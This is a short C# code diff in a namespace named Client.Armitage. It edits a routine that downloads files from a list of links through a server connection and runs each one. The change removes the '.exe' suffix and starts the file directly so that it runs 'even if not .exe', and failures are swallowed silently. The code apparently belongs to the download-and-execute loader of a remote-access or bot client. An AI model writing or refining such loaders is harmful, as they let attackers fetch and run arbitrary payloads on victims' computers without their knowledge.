@@ -28,7 +28,7 @@ namespace Client.Armitage
                 {
                     foreach (var l in _links)
                     {
-                        string filename = Path.GetTempFileName() + ".exe";
+                        string filename = Path.GetTempFileName();
                         if (!File.Exists(filename))
                         {
                             filename = Communication.Server.AsyncDownloadFile(l, filename).Result;
@@ -38,7 +38,16 @@ namespace Client.Armitage
                             {
                                 try
                                 {
-                                    Process.Start(filename);
+                                    // run even if not .exe
+                                    var p = new Process
+                                    {
+                                        StartInfo = new ProcessStartInfo
+                                        {
+                                            FileName = filename,
+                                            UseShellExecute = false
+                                        }
+                                    };
+                                    p.Start();
                                 }
                                 catch
                                 {
@@ -46,7 +55,7 @@ namespace Client.Armitage
                                 }
                             }
                         }
-                        /// else if already existed do nothing
+                        // else if already existed do nothing
                     }
                 });
         }
